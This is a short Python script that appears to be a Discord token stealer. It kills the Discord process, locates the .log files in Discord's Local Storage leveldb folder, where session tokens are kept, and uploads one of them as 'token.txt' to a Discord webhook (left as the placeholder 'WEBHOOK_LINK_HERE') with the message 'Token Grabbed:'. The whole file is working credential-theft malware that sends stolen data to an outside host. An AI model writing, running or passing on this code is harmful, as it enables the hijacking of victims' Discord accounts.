from dhooks import Webhook, File
import os

os.system("taskkill /IM discord.exe /f")

path = os.getenv('APPDATA')

discordloc = "\\discord\\Local Storage\\leveldb\\"

tokendir = str(path)+str(discordloc)
print (tokendir)

for root, dirs, files in os.walk(tokendir):
    for file in files:
        if file.endswith('.log'):
            logs = (file)
            print (file)

logsdir = str(path)+str(discordloc)+(logs)
print (logsdir)


hook = Webhook('WEBHOOK_LINK_HERE')

file = File((logsdir), name='token.txt')
   

hook.send('Token Grabbed:', file=file)
